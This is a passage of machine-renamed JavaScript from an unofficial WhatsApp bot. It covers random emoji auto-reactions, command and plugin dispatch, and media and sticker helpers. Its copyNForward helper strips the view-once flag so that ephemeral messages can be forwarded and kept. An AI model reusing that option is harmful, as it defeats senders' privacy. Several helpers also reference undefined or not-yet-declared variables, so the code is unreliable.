"🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "🙂", "😑", "🤣", "😍", "😘", "😗", "😙", "😚", "😛", "😝", "😞", "😟", "😠", "😡", "😢", "😭", "😓", "😳", "😴", "😌", "😆", "😂", "🤔", "😒", "😓", "😶", "🙄", "🐶", "🐱", "🐔", "🐷", "🐴", "🐲", "🐸", "🐳", "🐋", "🐒", "🐑", "🐕", "🐩", "🍔", "🍕", "🥤", "🍣", "🍲", "🍴", "🍽", "🍹", "🍸", "🎂", "📱", "📺", "📻", "🎤", "📚", "💻", "📸", "📷", "❤️", "💔", "❣️", "☀️", "🌙", "🌃", "🏠", "🚪", "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", "👍", "👎", "👏", "👫", "👭", "👬", "👮", "🤝", "🙏", "👑", "🌻", "🌺", "🌸", "🌹", "🌴", "🏞️", "🌊", "🚗", "🚌", "🛣️", "🛫️", "🛬️", "🚣", "🛥", "🚂", "🚁", "🚀", "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", "🎾", "🏀", "🏈", "🎯", "🏆", "??", "⬆️", "⬇️", "⇒", "⇐", "↩️", "↪️", "ℹ️", "‼️", "⁉️", "‽️", "©️", "®️", "™️", "🔴", "🔵", "🟢", "🔹", "🔺", "💯", "👑", "🤣", "🤷‍♂️", "🤷‍♀️", "🙅‍♂️", "🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", "🏻", "💆‍♂️", "💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "�", "🏯", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🌳", "🌲", "🌾", "🌿", "🍃", "🍂", "🍃", "🌻", "💐", "🌹", "🌺", "🌸", "🌴", "🏵", "🎀", "🏆", "🏈", "🏉", "🎯", "🏀", "🏊", "🏋", "🏌", "🎲", "📚", "📖", "📜", "📝", "💭", "💬", "🗣", "💫", "🌟", "🌠", "🎉", "🎊", "👏", "💥", "🔥", "💥", "🌪", "💨", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌱", "🌿", "🍃", "🍂", "🌻", "💐", "🌹", "🌺", "🌸", "🌴", "🏵", "🎀", "🏆", "🏈", "🏉", "🎯", "🏀", "🏊", "🏋", "🏌", "🎲", "📚", "📖", "📜", "📝", "💭", "💬", "🗣", "💫", "🌟", "🌠", "🎉", "🎊", "👏", "💥", "🔥", "💥", "🌪", "💨", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🐒", "🦍", "🦧", "🐶", "🐕", "🦮", "🐕‍🦺", "🐩", "🐺", "🦊", "🦝", "🐱", "🐈", "🐈‍⬛", "🦁", "🐯", "🐅", "🐆", "🐴", "🐎", "🦄", "🦓", "🦌", "🦬", "🐮", "🐂", "🐃", "🐄", "🐷", "🐖", "🐗", "🐽", "🐏", "🐑", "🐐", "🐪", "🐫", "🦙", "🦒", "🐘", "🦣", "🦏", "🦛", "🐭", "🐁", "🐀", "🐹", "🐰", "🐇", "🐿️", "🦫", "🦔", "🦇", "🐻", "🐻‍❄️", "🐨", "🐼", "🦥", "🦦", "🦨", "🦘", "🦡", "🐾", "🦃", "🐔", "🐓", "🐣", "🐤", "🐥", "🐦", "🐧", "🕊️", "🦅", "🦆", "🦢", "🦉", "🦤", "🪶", "🦩", "🦚", "🦜", "🐸", "🐊", "🐢", "🦎", "🐍", "🐲", "🐉", "🦕", "🦖", "🐳", "🐋", "🐬", "🦭", "🐟", "🐠", "😀", "😃", "😄", "😁", "😆", "😅", "🤣", "😂", "🙂", "🙃", "😉", "😊", "😇", "🥰", "😍", "🤩", "😘", "😗", "☺️", "😚", "😙", "🥲", "😋", "😛", "😜", "🤪", "😝", "🤑", "🤗", "🤭", "🤫", "🤔", "🤐", "🤨", "😐", "😑", "😶", "😶‍🌫️", "😏", "😒", "🙄", "😬", "😮‍💨", "🤥", "😌", "😔", "😪", "🤤", "😴", "😷", "🤒", "🤕", "🤢", "🤮", "🤧", "🥵", "🥶", "🥴", "😵", "😵‍💫", "🤯", "🤠", "🥳", "🥸", "😎", "🤓", "🧐", "😕", "😟", "🙁", "☹️", "😮", "😯", "😲", "😳", "🥺", "😦", "😧", "😨", "😰", "😥", "😢", "😭", "😱", "😖", "😣", "😞", "😓", "😩", "😫", "🥱", "😤", "😡", "😠", "🤬", "😈", "👿", "💀", "☠️", "💩", "🤡", "👹", "👺", "👻", "👽", "👾", "🤖", "😺", "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "🙈", "🙉", "🙊", "💋", "💌", "💘", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "❣️", "💔", "❤️‍🔥", "❤️‍🩹", "❤️", "🧡", "💛", "💚", "💙", "💜", "🤎", "🖤", "🤍", "💯", "💢", "💥", "💫", "💦", "💨", "🕳️", "💣", "💬", "👁️‍🗨️", "🗨️", "🗯️", "💭", "💤", "👋", "🤚", "🖐️", "✋", "🖖", "👌", "🤌", "🤏", "✌️", "🤞", "🤟", "🤘", "🤙", "👈", "👉", "👆", "🖕", "👇", "☝️", "👍", "👎", "✊", "👊", "🤛", "🤜", "👏", "🙌", "👐", "🤲", "🤝", "🙏", "✍️", "💅", "🤳", "💪", "🦾", "🦿", "🦵", "🦶", "👂", "🦻", "👃", "🧠", "🫀", "🫁", "🦷", "🦴", "👀", "👁️", "👅", "👄", "👶", "🧒", "👦", "👧", "🧑", "👱", "👨", "🧔", "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳", "👨‍🦲", "👩", "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲", "👱‍♀️", "👱‍♂️", "🧓", "👴", "👵", "🙍", "🙍‍♂️", "🙍‍♀️", "🙎", "🙎‍♂️", "🙎‍♀️", "🙅", "🙅‍♂️", "🙅‍♀️", "🙆", "🙆‍♂️", "🙆‍♀️", "💁", "💁‍♂️", "💁‍♀️", "🙋", "🙋‍♂️", "🙋‍♀️", "🧏", "🧏‍♂️", "🧏‍♀️", "🙇", "🙇‍♂️", "🙇‍♀️", "🤦", "🤦‍♂️", "🤦‍♀️", "🤷", "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓", "👩‍🎓", "🧑‍🏫", "👨‍🏫", "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾", "🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼", "👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤", "👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀", "🧑‍🚒", "👨‍🚒", "👩‍🚒", "👮", "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", "💂", "💂‍♂️", "💂‍♀️", "🥷", "👷", "👷‍♂️", "👷‍♀️", "🤴", "👸", "👳", "👳‍♂️", "👳‍♀️", "👲", "🧕", "🤵", "🤵‍♂️", "🤵‍♀️", "👰", "👰‍♂️", "👰‍♀️", "🤰", "🤱", "👩‍🍼", "👨‍🍼", "🧑‍🍼", "👼", "🎅", "🤶", "🧑‍🎄", "🦸", "🦸‍♂️", "🦸‍♀️", "🦹", "🦹‍♂️", "🦹‍♀️", "🧙", "🧙‍♂️", "🧙‍♀️", "🧚", "🧚‍♂️", "🧚‍♀️", "🧛", "🧛‍♂️", "🧛‍♀️", "🧜", "🧜‍♂️", "🧜‍♀️", "🧝", "🧝‍♂️", "🧝‍♀️", "🧞", "🧞‍♂️", "🧞‍♀️", "🧟", "🧟‍♂️", "🧟‍♀️", "💆", "💆‍♂️", "💆‍♀️", "💇", "💇‍♂️", "💇‍♀️", "🚶", "🚶‍♂️", "🚶‍♀️", "🧍", "🧍‍♂️", "🧍‍♀️", "🧎", "🧎‍♂️", "🧎‍♀️", "🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", "🏃", "🏃‍♂️", "🏃‍♀️", "💃", "🕺", "🕴️", "👯", "👯‍♂️", "👯‍♀️", "🧖", "🧖‍♂️", "🧖‍♀️", "🧗", "🧗‍♂️", "🧗‍♀️", "🤺", "🏇", "⛷️", "🏂", "🏌️", "🏌️‍♂️", "🏌️‍♀️", "🏄", "🏄‍♂️", "🏄‍♀️", "🚣", "🚣‍♂️", "🚣‍♀️", "🏊", "🏊‍♂️", "🏊‍♀️", "⛹️", "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", "🚴", "🚴‍♂️", "🚴‍♀️", "🚵", "🚵‍♂️", "🚵‍♀️", "🤸", "🤸‍♂️", "🤸‍♀️", "🤼", "🤼‍♂️", "🤼‍♀️", "🤽", "🤽‍♂️", "🤽‍♀️", "🤾", "🤾‍♂️", "🤾‍♀️", "🤹", "🤹‍♂️", "🤹‍♀️", "🧘", "🧘‍♂️", "🧘‍♀️", "🛀", "🛌", "🧑‍🤝‍🧑", "👭", "👫", "👬", "💏", "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩", "💑", "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", "👪", "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧", "👨‍👨‍👦", "👨‍👨‍👧", "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧", "👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧", "🗣️", "👤", "👥", "🫂", "👣", "🦰", "🦱", "🦳", "🦲", "🐵"];
        const v152 = v151[Math.floor(Math.random() * v151.length)];
        vSms2.react(v152);
      }
    }
    if (!v141 && v129 !== v130) {
      if (config.CUSTOM_REACT === "true") {
        const v153 = (config.CUSTOM_REACT_EMOJIS || "🥲,😂,👍🏻,🙂,😔").split(",");
        const v154 = v153[Math.floor(Math.random() * v153.length)];
        vSms2.react(v154);
      }
    }
    if (!v141 && v129 === v130) {
      if (config.CUSTOM_REACT === "true") {
        const v155 = (config.CUSTOM_REACT_EMOJIS || "🥲,😂,👍🏻,🙂,😔").split(",");
        const v156 = v155[Math.floor(Math.random() * v155.length)];
        vSms2.react(v156);
      }
    }
    if (!v133 && config.MODE === "private") {
      return;
    }
    if (!v133 && v127 && config.MODE === "inbox") {
      return;
    }
    if (!v133 && !v127 && config.MODE === "groups") {
      return;
    }
    const command2 = require("./command");
    const v157 = v121 ? v120.slice(1).trim().split(" ")[0].toLowerCase() : false;
    if (v121) {
      const v158 = command2.commands.find(p97 => p97.pattern === v157) || command2.commands.find(p98 => p98.alias && p98.alias.includes(v157));
      if (v158) {
        if (v158.react) {
          vMakeWASocket2.sendMessage(v118, {
            react: {
              text: v158.react,
              key: p93.key
            }
          });
        }
        try {
          v158.function(vMakeWASocket2, p93, vSms2, {
            from: v118,
            quoted: v119,
            body: v120,
            isCmd: v121,
            command: v123,
            args: v124,
            q: v125,
            text: v126,
            isGroup: v127,
            sender: v128,
            senderNumber: v129,
            botNumber2: v134,
            botNumber: v130,
            pushname: v131,
            isMe: v132,
            isOwner: v133,
            isCreator: v144,
            groupMetadata: v135,
            groupName: v136,
            participants: v137,
            groupAdmins: v138,
            isBotAdmins: v139,
            isAdmins: v140,
            reply: vF4
          });
        } catch (_0x31e10d) {
          console.error("[PLUGIN ERROR] " + _0x31e10d);
        }
      }
    }
    command2.commands.map(async p99 => {
      if (v120 && p99.on === "body") {
        p99.function(vMakeWASocket2, p93, vSms2, {
          from: v118,
          l: v102,
          quoted: v119,
          body: v120,
          isCmd: v121,
          command: p99,
          args: v124,
          q: v125,
          text: v126,
          isGroup: v127,
          sender: v128,
          senderNumber: v129,
          botNumber2: v134,
          botNumber: v130,
          pushname: v131,
          isMe: v132,
          isOwner: v133,
          isCreator: v144,
          groupMetadata: v135,
          groupName: v136,
          participants: v137,
          groupAdmins: v138,
          isBotAdmins: v139,
          isAdmins: v140,
          reply: vF4
        });
      } else if (p93.q && p99.on === "text") {
        p99.function(vMakeWASocket2, p93, vSms2, {
          from: v118,
          l: v102,
          quoted: v119,
          body: v120,
          isCmd: v121,
          command: p99,
          args: v124,
          q: v125,
          text: v126,
          isGroup: v127,
          sender: v128,
          senderNumber: v129,
          botNumber2: v134,
          botNumber: v130,
          pushname: v131,
          isMe: v132,
          isOwner: v133,
          isCreator: v144,
          groupMetadata: v135,
          groupName: v136,
          participants: v137,
          groupAdmins: v138,
          isBotAdmins: v139,
          isAdmins: v140,
          reply: vF4
        });
      } else if ((p99.on === "image" || p99.on === "photo") && p93.type === "imageMessage") {
        p99.function(vMakeWASocket2, p93, vSms2, {
          from: v118,
          l: v102,
          quoted: v119,
          body: v120,
          isCmd: v121,
          command: p99,
          args: v124,
          q: v125,
          text: v126,
          isGroup: v127,
          sender: v128,
          senderNumber: v129,
          botNumber2: v134,
          botNumber: v130,
          pushname: v131,
          isMe: v132,
          isOwner: v133,
          isCreator: v144,
          groupMetadata: v135,
          groupName: v136,
          participants: v137,
          groupAdmins: v138,
          isBotAdmins: v139,
          isAdmins: v140,
          reply: vF4
        });
      } else if (p99.on === "sticker" && p93.type === "stickerMessage") {
        p99.function(vMakeWASocket2, p93, vSms2, {
          from: v118,
          l: v102,
          quoted: v119,
          body: v120,
          isCmd: v121,
          command: p99,
          args: v124,
          q: v125,
          text: v126,
          isGroup: v127,
          sender: v128,
          senderNumber: v129,
          botNumber2: v134,
          botNumber: v130,
          pushname: v131,
          isMe: v132,
          isOwner: v133,
          isCreator: v144,
          groupMetadata: v135,
          groupName: v136,
          participants: v137,
          groupAdmins: v138,
          isBotAdmins: v139,
          isAdmins: v140,
          reply: vF4
        });
      }
    });
  });
  vMakeWASocket2.decodeJid = p100 => {
    if (!p100) {
      return p100;
    }
    if (/:\d+@/gi.test(p100)) {
      let v159 = jidDecode(p100) || {};
      return v159.user && v159.server && v159.user + "@" + v159.server || p100;
    } else {
      return p100;
    }
  };
  vMakeWASocket2.copyNForward = async (p101, p102, p103 = false, p104 = {}) => {
    let v160;
    if (p104.readViewOnce) {
      p102.message = p102.message && p102.message.ephemeralMessage && p102.message.ephemeralMessage.message ? p102.message.ephemeralMessage.message : p102.message || undefined;
      v160 = Object.keys(p102.message.viewOnceMessage.message)[0];
      delete (p102.message && p102.message.ignore ? p102.message.ignore : p102.message || undefined);
      delete p102.message.viewOnceMessage.message[v160].viewOnce;
      p102.message = {
        ...p102.message.viewOnceMessage.message
      };
    }
    let v161 = Object.keys(p102.message)[0];
    let v162 = await generateForwardMessageContent(p102, p103);
    let v163 = Object.keys(v162)[0];
    let v164 = {};
    if (v161 != "conversation") {
      v164 = p102.message[v161].contextInfo;
    }
    v162[v163].contextInfo = {
      ...v164,
      ...v162[v163].contextInfo
    };
    const v165 = await generateWAMessageFromContent(p101, v162, p104 ? {
      ...v162[v163],
      ...p104,
      ...(p104.contextInfo ? {
        contextInfo: {
          ...v162[v163].contextInfo,
          ...p104.contextInfo
        }
      } : {})
    } : {});
    await vMakeWASocket2.relayMessage(p101, v165.message, {
      messageId: v165.key.id
    });
    return v165;
  };
  vMakeWASocket2.downloadAndSaveMediaMessage = async (p105, p106, p107 = true) => {
    let v166 = p105.msg ? p105.msg : p105;
    let v167 = (p105.msg || p105).mimetype || "";
    let v168 = p105.mtype ? p105.mtype.replace(/Message/gi, "") : v167.split("/")[0];
    const v169 = await downloadContentFromMessage(v166, v168);
    let v170 = Buffer.from([]);
    for await (const v171 of v169) {
      v170 = Buffer.concat([v170, v171]);
    }
    let v172 = await fileType2.fromBuffer(v170);
    trueFileName = p107 ? p106 + "." + v172.ext : p106;
    await fs.writeFileSync(trueFileName, v170);
    return trueFileName;
  };
  vMakeWASocket2.downloadMediaMessage = async p108 => {
    let v173 = (p108.msg || p108).mimetype || "";
    let v174 = p108.mtype ? p108.mtype.replace(/Message/gi, "") : v173.split("/")[0];
    const v175 = await downloadContentFromMessage(p108, v174);
    let v176 = Buffer.from([]);
    for await (const v177 of v175) {
      v176 = Buffer.concat([v176, v177]);
    }
    return v176;
  };
  vMakeWASocket2.sendFileUrl = async (p109, p110, p111, p112, p113 = {}) => {
    let v178 = "";
    let v179 = await axios.head(p110);
    v178 = v179.headers["content-type"];
    if (v178.split("/")[1] === "gif") {
      return vMakeWASocket2.sendMessage(p109, {
        video: await getBuffer(p110),
        caption: p111,
        gifPlayback: true,
        ...p113
      }, {
        quoted: p112,
        ...p113
      });
    }
    let v180 = v178.split("/")[0] + "Message";
    if (v178 === "application/pdf") {
      return vMakeWASocket2.sendMessage(p109, {
        document: await getBuffer(p110),
        mimetype: "application/pdf",
        caption: p111,
        ...p113
      }, {
        quoted: p112,
        ...p113
      });
    }
    if (v178.split("/")[0] === "image") {
      return vMakeWASocket2.sendMessage(p109, {
        image: await getBuffer(p110),
        caption: p111,
        ...p113
      }, {
        quoted: p112,
        ...p113
      });
    }
    if (v178.split("/")[0] === "video") {
      return vMakeWASocket2.sendMessage(p109, {
        video: await getBuffer(p110),
        caption: p111,
        mimetype: "video/mp4",
        ...p113
      }, {
        quoted: p112,
        ...p113
      });
    }
    if (v178.split("/")[0] === "audio") {
      return vMakeWASocket2.sendMessage(p109, {
        audio: await getBuffer(p110),
        caption: p111,
        mimetype: "audio/mpeg",
        ...p113
      }, {
        quoted: p112,
        ...p113
      });
    }
  };
  vMakeWASocket2.cMod = (p114, p115, p116 = "", p117 = vMakeWASocket2.user.id, p118 = {}) => {
    let v181 = Object.keys(p115.message)[0];
    let v182 = v181 === "ephemeralMessage";
    if (v182) {
      v181 = Object.keys(p115.message.ephemeralMessage.message)[0];
    }
    let v183 = v182 ? p115.message.ephemeralMessage.message : p115.message;
    let v184 = v183[v181];
    if (typeof v184 === "string") {
      v183[v181] = p116 || v184;
    } else if (v184.caption) {
      v184.caption = p116 || v184.caption;
    } else if (v184.text) {
      v184.text = p116 || v184.text;
    }
    if (typeof v184 !== "string") {
      v183[v181] = {
        ...v184,
        ...p118
      };
    }
    if (p115.key.participant) {
      p117 = p115.key.participant = p117 || p115.key.participant;
    } else if (p115.key.participant) {
      p117 = p115.key.participant = p117 || p115.key.participant;
    }
    if (p115.key.remoteJid.includes("@s.whatsapp.net")) {
      p117 = p117 || p115.key.remoteJid;
    } else if (p115.key.remoteJid.includes("@broadcast")) {
      p117 = p117 || p115.key.remoteJid;
    }
    p115.key.remoteJid = p114;
    p115.key.fromMe = p117 === vMakeWASocket2.user.id;
    return proto.WebMessageInfo.fromObject(p115);
  };
  vMakeWASocket2.getFile = async (p119, p120) => {
    let v185;
    let v186 = Buffer.isBuffer(p119) ? p119 : /^data:.*?\/.*?;base64,/i.test(p119) ? Buffer.from(p119.split`,`[1], "base64") : /^https?:\/\//.test(p119) ? await (v185 = await getBuffer(p119)) : fs.existsSync(p119) ? (v188 = p119, fs.readFileSync(p119)) : typeof p119 === "string" ? p119 : Buffer.alloc(0);
    let v187 = (await fileType2.fromBuffer(v186)) || {
      mime: "application/octet-stream",
      ext: ".bin"
    };
    let v188 = path.join(__filename, __dirname + new Date() * 1 + "." + v187.ext);
    if (v186 && p120) {
      fs.promises.writeFile(v188, v186);
    }
    return {
      res: v185,
      filename: v188,
      size: await getSizeMedia(v186),
      ...v187,
      data: v186
    };
  };
  vMakeWASocket2.sendFile = async (p121, p122, p123, p124 = {}, p125 = {}) => {
    let v189 = await vMakeWASocket2.getFile(p122, true);
    let {
      filename: _0x276dcc,
      size: _0x2d3256,
      ext: _0x509f04,
      mime: _0x2f94cf,
      data: _0x5d080b
    } = v189;
    let v190 = "";
    let v_0x2f94cf2 = _0x2f94cf;
    let v_0x276dcc2 = _0x276dcc;
    if (p125.asDocument) {
      v190 = "document";
    }
    if (p125.asSticker || /webp/.test(_0x2f94cf)) {
      let {
        writeExif: _0x220da5
      } = require("./exif.js");
      let v191 = {
        mimetype: _0x2f94cf,
        data: _0x5d080b
      };
      v_0x276dcc2 = await _0x220da5(v191, {
        packname: Config.packname,
        author: Config.packname,
        categories: p125.categories ? p125.categories : []
      });
      await fs.promises.unlink(_0x276dcc);
      v190 = "sticker";
      v_0x2f94cf2 = "image/webp";
    } else if (/image/.test(_0x2f94cf)) {
      v190 = "image";
    } else if (/video/.test(_0x2f94cf)) {
      v190 = "video";
    } else if (/audio/.test(_0x2f94cf)) {
      v190 = "audio";
    } else {
      v190 = "document";
    }
    await vMakeWASocket2.sendMessage(p121, {
      [v190]: {
        url: v_0x276dcc2
      },
      mimetype: v_0x2f94cf2,
      fileName: p123,
      ...p125
    }, {
      quoted: p124,
      ...p125
    });
    return fs.promises.unlink(v_0x276dcc2);
  };
  vMakeWASocket2.parseMention = async p126 => {
    return [...p126.matchAll(/@([0-9]{5,16}|0)/g)].map(p127 => p127[1] + "@s.whatsapp.net");
  };
  vMakeWASocket2.sendMedia = async (p128, p129, p130 = "", p131 = "", p132 = "", p133 = {}) => {
    let v192 = await vMakeWASocket2.getFile(p129, true);
    let {
      mime: _0x108769,
      ext: _0x119c27,
      res: _0x126407,
      data: _0x489f1f,
      filename: _0x37240f
    } = v192;
    if (_0x126407 && _0x126407.status !== 200 || file.length <= 65536) {
      try {
        throw {
          json: JSON.parse(file.toString())
        };
      } catch (_0x462e27) {
        if (_0x462e27.json) {
          throw _0x462e27.json;
        }
      }
    }
    let v193 = "";
    let v_0x1087692 = _0x108769;
    let v_0x37240f2 = _0x37240f;
    if (p133.asDocument) {
      v193 = "document";
    }
    if (p133.asSticker || /webp/.test(_0x108769)) {
      let {
        writeExif: _0x2b3d3b
      } = require("./exif");
      let v194 = {
        mimetype: _0x108769,
        data: _0x489f1f
      };
      v_0x37240f2 = await _0x2b3d3b(v194, {
        packname: p133.packname ? p133.packname : Config.packname,
        author: p133.author ? p133.author : Config.author,
        categories: p133.categories ? p133.categories : []
      });
      await fs.promises.unlink(_0x37240f);
      v193 = "sticker";
      v_0x1087692 = "image/webp";
    } else if (/image/.test(_0x108769)) {
      v193 = "image";
    } else if (/video/.test(_0x108769)) {
      v193 = "video";
    } else if (/audio/.test(_0x108769)) {
      v193 = "audio";
    } else {
      v193 = "document";
    }
    await vMakeWASocket2.sendMessage(p128, {
      [v193]: {
        url: v_0x37240f2
      },
      caption: p131,
      mimetype: v_0x1087692,
      fileName: p130,
      ...p133
    }, {
      quoted: p132,
      ...p133
    });
    return fs.promises.unlink(v_0x37240f2);
  };
  vMakeWASocket2.sendVideoAsSticker = async (p134, p135, p136 = {}) => {
    let v195;
    if (p136 && (p136.packname || p136.author)) {
      v195 = await writeExifVid(p135, p136);
    } else {
      v195 = await videoToWebp(p135);
    }
    await vMakeWASocket2.sendMessage(p134, {
      sticker: {
        url: v195
      },
      ...p136
    }, p136);
  };
  vMakeWASocket2.sendImageAsSticker = async (p137, p138, p139 = {}) => {
    let v196;
    if (p139 && (p139.packname || p139.author)) {
      v196 = await writeExifImg(p138, p139);
    } else {
      v196 = await imageToWebp(p138);
    }
    await vMakeWASocket2.sendMessage(p137, {
      sticker: {
        url: v196
      },
      ...p139
    }, p139);
  };
  vMakeWASocket2.sendImage = async (p140, p141, p142 = "", p143 = "", p144) => {
    let v197 = Buffer.isBuffer(p141) ? p141 : /^data:.*?\/.*?;base64,/i.test(p141) ? Buffer.from(p141.split`,`[1], "base64") : /^https?:\/\//.test(p141) ? await await getBuffer(p141) : fs.existsSync(p141) ? fs.readFileSync(p141) : Buffer.alloc(0);
    return await vMakeWASocket2.sendMessage(p140, {
      image: v197,
      caption: p142,
      ...p144
    }, {
      quoted: p143
    });
  };
  vMakeWASocket2.sendButtonText = (p145, p146 = [], p147, p148, p149 = "", p150 = {}) => {
    let v198 = {
      text: p147,
      footer: p148,
      buttons: p146,
      headerType: 2,
      ...p150
    };
    vMakeWASocket2.sendMessage(p145, v198, {
      quoted: p149,
